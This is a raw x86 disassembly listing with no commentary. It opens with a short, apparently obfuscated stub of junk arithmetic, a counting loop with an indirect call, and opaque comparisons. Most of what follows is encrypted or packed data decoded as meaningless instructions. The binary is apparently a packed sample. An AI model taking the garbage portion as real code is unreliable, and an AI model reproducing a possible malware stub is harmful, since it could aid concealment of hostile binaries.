  402a7b:	add    DWORD PTR ds:0x42d008,esi
  402a81:	xor    ecx,edx
  402a83:	add    esi,DWORD PTR ds:0x429018
  402a89:	mov    esi,0x3272dd
  402a8e:	sub    DWORD PTR ds:0x42d004,0x41ed
  402a98:	push   edi
  402a99:	mov    edi,DWORD PTR [ebp+0x10]
  402a9c:	add    ecx,esi
  402a9e:	mov    DWORD PTR ds:0x42c014,0x852
  402aa8:	cmp    ecx,edi
  402aaa:	mov    DWORD PTR ds:0x42b014,0x2a3e
  402ab4:	je     0x404f9d
  402aba:	inc    ecx
  402abb:	mov    ecx,DWORD PTR [ebp-0x4]
  402abe:	and    DWORD PTR ds:0x42a010,0x0
  402ac8:	mov    edi,DWORD PTR ds:0x42a010
  402ace:	inc    edi
  402acf:	mov    DWORD PTR ds:0x42a010,edi
  402ad5:	cmp    DWORD PTR ds:0x42a010,0x2a
  402adc:	jne    0x402ae8
  402ae2:	call   DWORD PTR ds:0x42ed71
  402ae8:	cmp    DWORD PTR ds:0x42a010,0x1b
  402aef:	jb     0x402ac8
  402af5:	mov    edi,DWORD PTR ds:0x42c00c
  402afb:	sbb    DWORD PTR ds:0x42a01c,edi
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	xor    DWORD PTR ds:0x429010,0x457d
  402b0e:	xor    eax,eax
  402b10:	xor    DWORD PTR ds:0x42c010,0x42b010
  402b1a:	xor    ecx,edx
  402b1c:	add    DWORD PTR ds:0x429028,0x1d9a
  402b26:	add    ecx,esi
  402b28:	add    edi,0xfabdbeed
  402b2e:	mov    DWORD PTR ds:0x42d014,0x7361
  402b38:	adc    eax,0xffffffff
  402b3b:	xor    eax,0x0
  402b3e:	mov    DWORD PTR [ebp-0xc],eax
  402b41:	push   ebx
  402b42:	xor    ebx,ebx
  402b44:	xor    edi,0x8a29a127
  402b4a:	mov    eax,ecx
  402b4c:	add    eax,0xfabdbeed
  402b51:	adc    ebx,0xffffffff
  402b54:	xor    eax,0x8a29a127
  402b59:	xor    ebx,0x0
  402b5c:	cmp    eax,edi
  402b5e:	jne    0x404f2f
  402b64:	cmp    ebx,DWORD PTR [ebp-0xc]
  402b67:	je     0x404f97
  402b6d:	jmp    0x404f2f
  402b72:	mov    esi,0x3272dd
  402b77:	jmp    0x404f2f
  402b7c:	jmp    0x402b15
  402b7e:	iret   
  402b7f:	push   esi
  402b80:	jae    0x402b78
  402b82:	retf   
  402b83:	xchg   edi,eax
  402b84:	mov    al,ds:0x3f55e01a
  402b89:	jnp    0x402b92
  402b8b:	stc    
  402b8c:	jp     0x402c08
  402b8e:	jp     0x402c0a
  402b90:	xlat   BYTE PTR ds:[ebx]
  402b91:	pop    edi
  402b92:	jp     0x402c0e
  402b94:	adc    eax,0x1921172c
  402b99:	and    eax,0x3c652f1b
  402b9e:	imul   esp,DWORD PTR [esi-0x19],0x6d6a6a67
  402ba5:	xor    al,ch
  402ba7:	fsubr  st(1),st
  402ba9:	push   eax
  402baa:	dec    eax
  402bab:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402baf:	pusha  
  402bb0:	ins    DWORD PTR es:[edi],dx
  402bb1:	pop    ecx
  402bb2:	iret   
  402bb3:	pop    ebp
  402bb4:	dec    edx
  402bb5:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  402bbc:	jg     0x402bf5
  402bbe:	jo     0x402b66
  402bc0:	jg     0x402b62
  402bc2:	mov    ds:0x66ff2c3b,al
  402bc7:	fdiv   st(2),st
  402bc9:	push   ebx
  402bca:	jg     0x402bea
  402bcc:	in     eax,dx
  402bcd:	cmp    ebp,ecx
  402bcf:	mov    edx,0xde1387ed
  402bd4:	mov    ebp,DWORD PTR [ecx]
  402bd6:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  402bdd:	fld    QWORD PTR [esp+edx*8]
  402be0:	push   cs
  402be1:	cli    
  402be2:	sbb    BYTE PTR es:[eax+0xc],cl
  402be6:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  402beb:	adc    eax,DWORD PTR [ecx+0x5]
  402bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bef:	(bad)  
  402bf0:	jmp    0x32b4573e
  402bf5:	enter  0xf95b,0x1a
  402bf9:	cli    
  402bfa:	js     0x402b9d
  402bfc:	arpl   bp,bx
  402bfe:	cwde   
  402bff:	pop    edi
  402c00:	mov    esp,DWORD PTR [ecx+0x31821407]
  402c06:	repz sahf 
  402c08:	cmp    al,0x72
  402c0a:	jae    0x402c17
  402c0c:	fisubr DWORD PTR ds:0x33348d52
  402c12:	push   esp
  402c13:	jecxz  0x402be4
  402c15:	mov    ch,BYTE PTR [ecx]
  402c17:	mov    DWORD PTR [eax+0x5188ccb7],esi
  402c1d:	in     al,0x45
  402c1f:	push   edx
  402c20:	dec    esp
  402c21:	or     al,0x3e
  402c23:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  402c2b:	rol    BYTE PTR [esi+edx*2],0xfd
  402c2f:	push   edx
  402c30:	push   esi
  402c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c32:	stc    
  402c33:	push   0x1642f8bf
  402c38:	xchg   ebp,eax
  402c39:	ret    0x2b23
  402c3c:	addr16 mov ecx,0xed6c2d9f
  402c42:	and    al,0xb4
  402c44:	jbe    0x402bfe
  402c46:	ds stos BYTE PTR es:[edi],al
  402c48:	fadd   QWORD PTR [ecx+0x59a0074d]
  402c4e:	pop    ss
  402c4f:	jecxz  0x402c90
  402c51:	add    edx,edi
  402c53:	jecxz  0x402c10
  402c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c56:	xor    eax,0xf960885c
  402c5b:	jle    0x402c7b
  402c5d:	and    bl,BYTE PTR [eax+0x12d4190a]
  402c63:	jb     0x402c67
  402c65:	stc    
  402c66:	stos   BYTE PTR es:[edi],al
  402c67:	push   ebx
  402c68:	je     0x402bf4
  402c6a:	call   0xf0f6a63
  402c6f:	jnp    0x402cdc
  402c71:	push   ds
  402c72:	add    al,0x39
  402c74:	sub    al,0xee
  402c76:	jne    0x402c57
  402c78:	mov    al,ds:0xb6d2bab6
  402c7d:	or     BYTE PTR [ebx],cl
  402c7f:	in     eax,dx
  402c80:	in     eax,0xb4
  402c82:	clc    
  402c83:	in     al,dx
  402c84:	pop    esp
  402c85:	or     esi,DWORD PTR [ecx]
  402c87:	pop    edx
  402c88:	scas   al,BYTE PTR es:[edi]
  402c89:	or     DWORD PTR [edi+0x34],edi
  402c8c:	push   ds
  402c8d:	aam    0xf5
  402c8f:	sub    esp,edi
  402c91:	sub    eax,0x8a23124a
  402c96:	popa   
  402c97:	xchg   DWORD PTR [edi+ecx*4-0x21],edi
  402c9b:	mov    bh,0x1e
  402c9d:	or     eax,0x4dfe8a05
  402ca2:	xlat   BYTE PTR ds:[ebx]
  402ca3:	or     ah,BYTE PTR [ecx]
  402ca5:	hlt    
  402ca6:	add    dl,dl
  402ca8:	push   DWORD PTR [eax]
  402caa:	out    0x31,al
  402cac:	mov    ds:0x60d81377,eax
  402cb1:	aad    0xe9
  402cb3:	stc    
  402cb4:	arpl   WORD PTR [ebx],bx
  402cb6:	sbb    BYTE PTR [ebx],bl
  402cb8:	xchg   ebx,eax
  402cb9:	mov    dh,0x9
  402cbb:	sti    
  402cbc:	fwait
  402cbd:	xchg   BYTE PTR [ebp-0x19],bl
  402cc0:	(bad)  
  402cc1:	in     al,0x52
  402cc3:	outs   dx,BYTE PTR ds:[esi]
  402cc4:	pop    ebx
  402cc5:	xlat   BYTE PTR ds:[ebx]
  402cc6:	and    dl,bl
  402cc8:	mov    ecx,0xfcf67c50
  402ccd:	xchg   ecx,eax
  402cce:	push   cs
  402ccf:	sbb    al,0x54
  402cd1:	jmp    0xaf8f:0xa9c17670
  402cd8:	aam    0x14
  402cda:	cld    
  402cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cdc:	and    BYTE PTR [ebp+0x64ff1a29],dh
  402ce2:	or     ah,dl
  402ce4:	cwde   
  402ce5:	adc    eax,0x379da2bb
  402cea:	out    dx,al
  402ceb:	in     eax,0x1
  402ced:	xchg   esi,eax
  402cee:	pop    ebx
  402cef:	rcl    DWORD PTR [eax+0x51bd6e24],1
  402cf5:	or     edx,DWORD PTR [edx+esi*2-0x74290045]
  402cfc:	jo     0x402c8c
  402cfe:	xchg   DWORD PTR [edx-0x41],esp
  402d01:	cld    
  402d02:	(bad)  
  402d03:	cli    
  402d04:	ret    0xac37
  402d07:	xlat   BYTE PTR ds:[ebx]
  402d08:	cmp    BYTE PTR [ebp+0x2f9741b5],bl
  402d0e:	rcl    DWORD PTR [ecx-0x3d],0xca
  402d12:	mov    ebp,DWORD PTR [ebp+0x2b]
  402d15:	(bad)  
  402d16:	mov    edx,0xa2e79b16
  402d1b:	pusha  
  402d1c:	inc    esi
  402d1d:	leave  
  402d1e:	add    ah,0x3c
  402d21:	dec    ebx
  402d22:	rcr    DWORD PTR [esi-0xd17cac5],cl
  402d28:	dec    esi
  402d29:	(bad)  
  402d2a:	in     al,dx
  402d2b:	jmp    0xdda4:0x4caa41bd
  402d32:	pop    edi
  402d33:	push   es
  402d34:	imul   ebp,DWORD PTR [esp+esi*1-0x2],0xffffffe4
  402d39:	mov    BYTE PTR ss:[esi+ebx*4],dh
  402d3d:	sahf   
  402d3e:	aam    0xfa
  402d40:	(bad)  
  402d41:	jmp    0xc525:0x44731f20
  402d48:	js     0x402d66
  402d4a:	loop   0x402d51
  402d4c:	ret    0xb8b
  402d4f:	and    eax,0xfbf278f0
  402d54:	call   0xc990:0x3983532e
  402d5b:	(bad)  
  402d5c:	es inc ecx
  402d5e:	xchg   edi,eax
  402d5f:	inc    esi
  402d60:	xor    eax,0xf60f4ca8
  402d65:	aad    0xcc
  402d67:	jno    0x402d25
  402d69:	bound  esp,QWORD PTR [eax]
  402d6b:	mov    esi,0xba6a30a3
  402d70:	nop
  402d71:	inc    edi
  402d72:	push   edx
  402d73:	dec    ebx
  402d74:	sbb    BYTE PTR [ebx-0x8],0xd9
  402d78:	xchg   edi,eax
  402d79:	jno    0x402dec
  402d7b:	pop    ebx
  402d7c:	sub    DWORD PTR [edi+0x50700ad3],esp
  402d82:	add    eax,0x8039c4d3
  402d87:	int3   
  402d88:	mov    ah,0x5f
  402d8a:	stos   BYTE PTR es:[di],al
  402d8c:	cld    
  402d8d:	or     eax,0x965516c7
  402d92:	inc    eax
  402d93:	cmp    ecx,DWORD PTR [esi+0x6f]
  402d96:	or     ecx,eax
  402d98:	and    ebx,DWORD PTR [eax]
  402d9a:	cmc    
  402d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d9c:	push   esi
  402d9d:	mov    ?,WORD PTR [esi]
  402d9f:	jmp    0x1ff0:0x39205661
  402da6:	out    dx,eax
  402da7:	ins    BYTE PTR es:[edi],dx
  402da8:	dec    ebx
  402da9:	sub    BYTE PTR [edi+eiz*4-0x2],dh
  402dad:	adc    ecx,DWORD PTR [edx]
  402daf:	xchg   ebx,eax
  402db0:	sbb    BYTE PTR [eax],bh
  402db2:	push   ss
  402db3:	fcomp  QWORD PTR [eax+0x7e154c57]
  402db9:	(bad)  
  402dba:	xor    ecx,DWORD PTR [ecx-0x69]
  402dbd:	and    al,0x61
  402dbf:	mov    ds:0x806e647f,eax
  402dc4:	mov    ds:0x80cd1eb7,eax
  402dc9:	mov    ah,0x99
  402dcb:	(bad)  
  402dcc:	adc    ebp,eax
  402dce:	dec    esi
  402dcf:	es iret 
  402dd1:	dec    edx
  402dd2:	jb     0x402dea
  402dd4:	fmulp  st(0),st
  402dd6:	call   0x77956a05
  402ddb:	mul    BYTE PTR [edi+eax*8-0x65]
  402ddf:	cmc    
  402de0:	cmc    
  402de1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402de2:	ins    BYTE PTR es:[edi],dx
  402de3:	adc    bl,dl
  402de5:	daa    
  402de6:	push   0x4a52b29b
  402deb:	add    edi,DWORD PTR [eax+0x5b5d3b88]
  402df1:	inc    ecx
  402df2:	mov    dh,0x9e
  402df4:	dec    esi
  402df5:	mov    WORD PTR [ebp+0x34],?
  402df8:	es jge 0x402db6
  402dfb:	ja     0x402dc4
  402dfd:	or     DWORD PTR [edx-0x14],esi
  402e00:	jbe    0x402e56
  402e02:	and    BYTE PTR [eax-0x39407f5e],bh
  402e08:	or     DWORD PTR [edi+0x4328fa88],0xffffffba
  402e0f:	pop    eax
  402e10:	xchg   esp,eax
  402e11:	pop    ecx
  402e12:	mov    WORD PTR [eax+eiz*4-0x5e],cs
  402e16:	jecxz  0x402db6
  402e18:	es pop esp
  402e1a:	imul   ebx,DWORD PTR [eax-0x6b],0x60585182
  402e21:	nop
  402e22:	shr    cl,1
  402e24:	shld   DWORD PTR [edx+0x25f95416],esi,cl
  402e2b:	aam    0x7b
  402e2d:	xor    DWORD PTR [ebx+0x46],0xfffffffb
  402e31:	pop    eax
  402e32:	retf   
  402e33:	sbb    edx,DWORD PTR [ebx-0x41]
  402e36:	iret   
  402e37:	jne    0x402eb8
  402e39:	push   edx
  402e3a:	sub    ecx,DWORD PTR [ebp-0x51]
  402e3d:	mov    al,0x5
  402e3f:	adc    DWORD PTR [eax-0x1],ecx
  402e42:	rcr    dh,0x6f
  402e45:	xor    edx,DWORD PTR [ebx+ebp*1-0x3f06330f]
  402e4c:	mov    esi,0x18358d2d
  402e51:	repnz or ch,BYTE PTR [edi+0x6d]
  402e55:	push   cs
  402e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e57:	sbb    BYTE PTR [edx-0x6139a2ba],dh
  402e5d:	add    eax,0x284408a5
  402e62:	xchg   ebp,eax
  402e63:	imul   ebx,eax,0x3a
  402e66:	clc    
  402e67:	dec    ebx
  402e68:	ret    0xd650
  402e6b:	cmp    edi,ebp
  402e6d:	mov    esp,0x74ef67a4
  402e72:	jp     0x402ecf
  402e74:	jns    0x402eb9
  402e76:	push   ebx
  402e77:	test   eax,0xfbb42ea8
  402e7c:	cmp    BYTE PTR [ebp+0x20],cl
  402e7f:	into   
  402e80:	xchg   edx,eax
  402e81:	jmp    0x7086:0x1505a7b6
  402e88:	hlt    
  402e89:	dec    esp
  402e8a:	mov    dh,0x2a
  402e8c:	xchg   ebp,eax
  402e8d:	mov    edx,0x47214bd3
  402e92:	ins    BYTE PTR es:[edi],dx
  402e93:	aam    0x47
  402e95:	retf   0xb9f8
  402e98:	popa   
  402e99:	cmp    ah,BYTE PTR es:[esp+eax*2-0x7b322b7f]
  402ea1:	aas    
  402ea2:	je     0x402e79
  402ea4:	inc    edx
  402ea5:	cdq    
  402ea6:	mov    ch,BYTE PTR [esi+ebp*1-0x4e]
  402eaa:	ror    BYTE PTR [ecx+edx*2],0x71
  402eae:	ret    
  402eaf:	cmp    eax,0xa8a660eb
  402eb4:	add    DWORD PTR [ecx-0x32bea6a],edi
  402eba:	stos   DWORD PTR es:[edi],eax
  402ebb:	mov    ebp,0xc4d03e78
  402ec0:	out    0xce,al
  402ec2:	push   ecx
  402ec3:	mov    esi,0x159732a9
  402ec8:	in     eax,dx
  402ec9:	ret    0xbb98
  402ecc:	push   cs
  402ecd:	sbb    al,0x1b
  402ecf:	popf   
  402ed0:	ds ss mov esi,cs
  402ed4:	xor    esp,edx
  402ed6:	jecxz  0x402ee4
  402ed8:	loop   0x402eb7
  402eda:	jecxz  0x402e8f
  402edc:	sbb    eax,0x128f7ce0
  402ee1:	ds jmp 0xa58b8619
  402ee7:	or     al,0xd9
  402ee9:	mov    ?,WORD PTR [edx+ebx*1+0x1d4f54c8]
  402ef0:	and    al,0xd0
  402ef2:	mov    ecx,0x8f34d13e
  402ef7:	and    al,0xc
  402ef9:	shl    al,0x9b
  402efc:	add    BYTE PTR [ebx],bl
  402efe:	daa    
  402eff:	dec    ecx
  402f00:	je     0x402ed5
  402f02:	xchg   BYTE PTR [ebp+0x2235bd67],dh
  402f08:	mov    bh,0xf0
  402f0a:	pusha  
  402f0b:	jb     0x402ef5
  402f0d:	loopne 0x402eba
  402f0f:	push   0xffffffff
  402f11:	xor    BYTE PTR [ebx+0x22291bd3],bh
  402f17:	outs   dx,DWORD PTR ds:[esi]
  402f18:	mov    ch,0xef
  402f1a:	jmp    0x402eff
  402f1c:	mov    ds:0x4b06fc63,eax
  402f21:	and    eax,0x3eb2b6e5
  402f26:	ret    
  402f27:	gs push 0x5f
  402f2a:	inc    eax
  402f2b:	test   BYTE PTR [ebx-0x68],dl
  402f2e:	mov    DWORD PTR [eax+0x18f53d26],0xfe474864
  402f38:	dec    ebp
  402f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f3a:	pop    ss
  402f3b:	sti    
  402f3c:	adc    eax,0xcfbab2d0
  402f41:	and    DWORD PTR [ebx],ebp
  402f43:	sbb    dh,bl
  402f45:	lods   eax,DWORD PTR ds:[esi]
  402f46:	cs lahf 
  402f48:	les    esp,FWORD PTR [ebx+0x1affe629]
  402f4e:	pop    edx
  402f4f:	into   
  402f50:	xor    al,0xbe
  402f52:	stos   BYTE PTR es:[edi],al
  402f53:	push   es
  402f54:	ret    
  402f55:	call   0xd8d12070
  402f5a:	push   es
  402f5b:	js     0x402f60
  402f5d:	or     ecx,ebx
  402f5f:	mov    ds:0x1f35ecab,eax
  402f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f65:	ds leave 
  402f67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f68:	bound  esi,QWORD PTR [edx+edx*4+0x52]
  402f6c:	push   ebp
  402f6d:	adc    edx,DWORD PTR [esi]
  402f6f:	pop    edi
  402f70:	xor    BYTE PTR [edi-0x32],cl
  402f73:	mov    eax,ds:0x9a901bf3
  402f78:	xchg   ebp,eax
  402f79:	pop    ds
  402f7a:	ins    BYTE PTR es:[edi],dx
  402f7b:	fild   WORD PTR [ebx+0x353ff288]
  402f81:	xor    eax,0x58dae4e7
  402f86:	push   0xffffffa1
  402f88:	jb     0x402ffb
  402f8a:	jl     0x402f33
  402f8c:	ja     0x402f2a
  402f8e:	and    al,BYTE PTR [ebx]
  402f90:	popf   
  402f91:	pop    ss
  402f92:	repz icebp 
  402f94:	xor    DWORD PTR ds:0xf7ed4893,0x4e
  402f9b:	sub    esp,DWORD PTR [esp+ebx*1+0x92c6545]
  402fa2:	pop    esp
  402fa3:	xchg   edi,eax
  402fa4:	ja     0x40301f
  402fa6:	dec    ebx
  402fa7:	aaa    
  402fa8:	mov    ah,0x12
  402faa:	mov    ebx,0x5d89511c
  402faf:	pop    ebx
  402fb0:	lea    ebx,[ebx+0x5c]
  402fb3:	sub    ah,0x27
  402fb6:	out    dx,al
  402fb7:	or     BYTE PTR [edi-0x11d47e66],bl
  402fbd:	push   ebp
  402fbe:	push   ecx
  402fbf:	aam    0x50
  402fc1:	test   DWORD PTR [edi-0x4f96839d],0xd42517fa
  402fcb:	call   0x6c13cca3
  402fd0:	or     al,0xc6
  402fd2:	sub    eax,0x50d6631d
  402fd7:	pop    eax
  402fd8:	xchg   esp,eax
  402fd9:	pop    es
  402fda:	mov    eax,0x34bf14d2
  402fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fe0:	fiadd  DWORD PTR [edi+ebp*8-0x13314c10]
  402fe7:	xor    DWORD PTR [ebp-0x1],esi
  402fea:	sbb    al,0x41
  402fec:	scas   eax,DWORD PTR es:[edi]
  402fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fee:	fsqrt  
  402ff0:	loop   0x402fa4
  402ff2:	inc    edi
  402ff3:	sub    al,0x49
  402ff5:	and    eax,0xd5f4b629
  402ffa:	pop    ds
  402ffb:	std    
  402ffc:	mov    esi,0xfb6525c
  403001:	push   edx
  403002:	mov    dl,0x5c
  403004:	mov    ebp,0x51386e87
  403009:	std    
  40300a:	add    al,0x3f
  40300c:	retf   0x2769
  40300f:	jg     0x40302b
  403011:	jbe    0x403009
  403013:	ret    
  403014:	(bad)  
  403015:	(bad)  
  403016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403017:	inc    esp
  403018:	adc    DWORD PTR [ebx-0x58],ebx
  40301b:	mov    al,ds:0x78e3eac4
  403020:	add    eax,0x715bd905
  403025:	mov    al,0xae
  403027:	push   ss
  403028:	gs ins BYTE PTR es:[edi],dx
  40302a:	cli    
  40302b:	dec    ebp
  40302c:	sbb    dl,dh
  40302e:	mov    fs,WORD PTR [ecx-0x4a]
  403031:	sub    bh,BYTE PTR [ebp-0x22]
  403034:	dec    ebp
  403035:	mov    cl,BYTE PTR [ecx+0x4c]
  403038:	nop
  403039:	in     eax,0x76
  40303b:	add    eax,0xa85b354a
  403040:	sti    
  403041:	jl     0x403067
  403043:	pop    ebp
  403044:	inc    ebx
  403045:	push   ebp
  403046:	jo     0x403007
  403048:	lods   eax,DWORD PTR ds:[esi]
  403049:	loop   0x40300e
  40304b:	retf   0x93bb
  40304e:	mov    gs,WORD PTR [ebx+eax*4]
  403051:	push   es
  403052:	daa    
  403053:	(bad)  
  403054:	jle    0x403097
  403056:	lods   al,BYTE PTR ds:[esi]
  403057:	out    0x73,al
  403059:	in     eax,0xfe
  40305b:	repnz scas al,BYTE PTR es:[edi]
  40305d:	mov    bl,BYTE PTR [ecx]
  40305f:	mov    ecx,0x1e70161a
  403064:	js     0x40303c
  403066:	pop    ecx
  403067:	imul   edi,DWORD PTR [edi-0x60],0x172a1186
  40306e:	cld    
  40306f:	inc    ebx
  403070:	nop
  403071:	mov    cl,0xe3
  403073:	or     al,0x6d
  403075:	(bad)  
  403077:	das    
  403078:	adc    BYTE PTR [edi+0x13],cl
  40307b:	gs inc edx
  40307d:	dec    esi
  40307e:	out    dx,eax
  40307f:	cli    
  403080:	dec    edx
  403081:	inc    edx
  403082:	retf   
  403083:	or     DWORD PTR ds:0x4b98c128,ebx
  403089:	in     al,0xd6
  40308b:	imul   edx,DWORD PTR [esi+0x44],0x4d4be0e7
  403092:	xchg   edi,eax
  403093:	loop   0x4030ec
  403095:	lds    edx,FWORD PTR [ebx]
  403097:	neg    BYTE PTR [esi]
  403099:	jno    0x40302f
  40309b:	sahf   
  40309c:	std    
  40309d:	add    ebp,esi
  40309f:	dec    ebp
  4030a0:	retf   0x9e6b
  4030a3:	arpl   WORD PTR [edi-0x12],bp
  4030a6:	sahf   
  4030a7:	push   0x22
  4030a9:	lock repnz xor ecx,DWORD PTR [edx-0x45]
  4030ae:	jp     0x403091
  4030b0:	jns    0x403085
  4030b2:	pop    edi
  4030b3:	jle    0x403116
  4030b5:	mov    BYTE PTR gs:[edi+edx*8+0x1e],bh
  4030ba:	adc    dl,bh
  4030bc:	xchg   BYTE PTR [ebp-0x17],ah
  4030bf:	cmp    bh,cl
  4030c1:	add    ah,BYTE PTR [ebx+0x7da3523]
  4030c7:	xor    ebp,0x11
  4030ca:	scas   al,BYTE PTR es:[edi]
  4030cb:	mov    cl,0x67
  4030cd:	in     al,dx
  4030ce:	dec    esi
  4030cf:	std    
  4030d0:	aas    
  4030d1:	xor    bl,BYTE PTR [ebx+0x32]
  4030d4:	pop    edx
  4030d5:	mov    DWORD PTR [ecx+ebx*8],ebx
  4030d8:	jle    0x4030b6
  4030da:	mov    al,ds:0xbe489e39
  4030df:	jb     0x403068
  4030e1:	dec    BYTE PTR [ebx*1-0x7d4cd969]
  4030e8:	ret    
  4030e9:	scas   eax,DWORD PTR es:[edi]
  4030ea:	int    0xe2
  4030ec:	in     al,0x2d
  4030ee:	lods   al,BYTE PTR ds:[esi]
  4030ef:	gs inc eax
  4030f1:	in     al,0xf2
  4030f3:	xchg   edi,eax
  4030f4:	jnp    0x40309a
  4030f6:	stos   BYTE PTR es:[edi],al
  4030f7:	lea    ecx,[ebp-0x7d0d363b]
  4030fd:	dec    ebp
  4030ff:	push   edi
  403100:	adc    eax,0x1d3bf786
  403105:	adc    eax,0xb0d0e044
  40310a:	mov    ebx,0x16e46f35
  40310f:	stos   DWORD PTR es:[edi],eax
  403110:	scas   eax,DWORD PTR es:[edi]
  403111:	mov    eax,ds:0xaa34e8ba
  403116:	xor    BYTE PTR [eax],cl
  403118:	jb     0x4030d5
  40311a:	sbb    al,0x8d
  40311c:	sbb    edi,DWORD PTR [edx+0x3e5ba484]
  403122:	psubsw mm5,QWORD PTR [ecx]
  403125:	and    DWORD PTR [edx],edi
  403127:	cld    
  403128:	dec    esi
  403129:	call   0x8ca02015
  40312e:	pop    eax
  40312f:	cwde   
  403130:	push   esi
  403131:	das    
  403132:	jne    0x403185
  403134:	xor    al,al
  403136:	pusha  
  403137:	sar    bh,cl
  403139:	push   ecx
  40313a:	pop    ecx
  40313b:	sbb    DWORD PTR [ebx+0x204f0ae5],edi
  403141:	das    
  403142:	push   es
  403143:	popf   
  403144:	ins    BYTE PTR es:[edi],dx
  403145:	inc    ebp
  403146:	and    al,0xe3
  403148:	mov    bl,0xf7
  40314a:	mov    eax,ds:0x594567b1
  40314f:	shl    BYTE PTR [eax+0x52],0x19
  403153:	add    eax,0xcbcdbdf4
  403158:	cmp    bh,BYTE PTR [ebp-0x3cd47d32]
  40315e:	add    al,0xda
  403160:	dec    esp
  403161:	mov    dl,0xd9
  403163:	rol    BYTE PTR [ecx+edi*2+0x6c],cl
  403167:	loopne 0x4031d8
  403169:	test   eax,0xde11f237
  40316e:	shr    DWORD PTR [ebx-0x39],0xc6
  403172:	mov    ds:0x9ab086af,eax
  403177:	out    dx,al
  403178:	mov    ch,0xab
  40317a:	xor    eax,0x471ab92f
  40317f:	cmc    
  403180:	mov    WORD PTR [edx+0x3],ds
  403183:	rcr    ah,0xa3
  403186:	out    dx,al
  403187:	cs push ebp
  403189:	push   0xf2c6d9ff
  40318e:	xchg   esi,eax
  40318f:	fsub   QWORD PTR [edx-0x29e7a995]
  403195:	cmp    eax,DWORD PTR [ecx-0x2327a3b2]
  40319b:	arpl   WORD PTR [ebx+0x28],ax
  40319e:	jecxz  0x4031da
  4031a0:	sub    ecx,edi
  4031a2:	aad    0xd2
  4031a4:	icebp  
  4031a5:	mov    edi,0x81667955
  4031aa:	ss cmp DWORD PTR ds:[ebx-0x7acc9c37],edx
  4031b2:	cmp    BYTE PTR [ebx],al
  4031b4:	dec    edi
  4031b5:	popa   
  4031b6:	xchg   edx,eax
  4031b7:	sbb    eax,0x38a7746c
  4031bc:	aaa    
  4031bd:	inc    ebp
  4031be:	or     esp,esi
  4031c0:	hlt    
  4031c1:	pop    ebp
  4031c2:	cmp    BYTE PTR [ebx-0x6a870354],bl
  4031c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031c9:	setb   bh
  4031cc:	sub    dl,BYTE PTR [esi-0x7d]
  4031cf:	fld    QWORD PTR [esi+0x35ecdcc0]
  4031d5:	ret    
  4031d6:	js     0x4031d0
  4031d8:	pop    ds
  4031d9:	pop    edx
  4031da:	mov    ebx,0x25b6da4e
  4031df:	mov    WORD PTR [ecx-0x6eac7bd8],?
  4031e5:	mov    esi,0x993c6fe8
  4031ea:	mov    dh,0x44
  4031ec:	outs   dx,DWORD PTR ds:[esi]
  4031ed:	(bad)  
  4031ee:	fisub  DWORD PTR [ecx-0x16ccfb2e]
  4031f4:	fisubr DWORD PTR [ecx-0x2e2551df]
  4031fa:	jmp    0x185155a3
  4031ff:	jbe    0x4031f6
  403201:	out    0xd3,al
  403203:	xchg   esi,eax
  403204:	mov    eax,0x9ce9a8e9
  403209:	sbb    dh,ah
  40320b:	fcomp  st(3)
  40320d:	gs in  eax,0x7f
  403210:	cmp    dl,BYTE PTR [esi+0x4a47df3a]
  403216:	and    esi,DWORD PTR [ebx-0x2d40df5]
  40321c:	popf   
  40321d:	and    al,0x67
  40321f:	dec    esi
  403220:	inc    ebx
  403221:	xor    eax,0x2303a26e
  403226:	inc    esi
  403227:	sbb    eax,0x98a1fd80
  40322c:	ds mov esi,0x61d65f10
  403232:	das    
  403233:	ror    BYTE PTR [edi+edi*2+0x2a],1
  403237:	mov    ecx,0xcf7e74ed
  40323c:	cdq    
  40323d:	jne    0x40323b
  40323f:	std    
  403240:	mov    esi,0x6be4ebf8
  403245:	sub    bl,cl
  403247:	mov    eax,ds:0x14b4dd2b
  40324c:	sbb    DWORD PTR [esi+0x689bb665],ebp
  403252:	sbb    ah,BYTE PTR ds:0x99cedfb0
  403258:	jmp    0x897866f9
  40325d:	pop    ebp
  40325e:	adc    esi,DWORD PTR [ebx]
  403260:	pop    ds
  403261:	mov    al,0x9e
  403263:	mov    edx,DWORD PTR [ebp-0x145bea38]
  403269:	loopne 0x4032b5
  40326b:	push   ds
  40326c:	dec    ebx
  40326d:	sub    cl,cl
  40326f:	push   0xc3114dea
  403274:	sbb    DWORD PTR [esi-0x5b],ebx
  403277:	xchg   BYTE PTR [esi],dh
  403279:	add    ebx,edx
  40327b:	test   BYTE PTR [eax-0x42],cl
  40327e:	les    edx,FWORD PTR [edi]
  403280:	adc    edx,DWORD PTR [esi-0x2fa29645]
  403286:	daa    
  403287:	scas   al,BYTE PTR es:[edi]
  403288:	jns    0x40321e
  40328a:	cdq    
  40328b:	push   edi
  40328c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40328d:	lahf   
  40328e:	xor    edi,DWORD PTR [edx-0x33d36e90]
  403294:	int    0xf3
  403296:	lahf   
  403297:	mov    ebx,0x63d584f8
  40329c:	adc    BYTE PTR [edx+ebp*2],dl
  40329f:	xchg   edi,eax
  4032a0:	inc    ebp
  4032a1:	mov    ch,0xea
  4032a3:	and    ah,BYTE PTR [ebx+esi*8]
  4032a6:	cmp    eax,0x6324f937
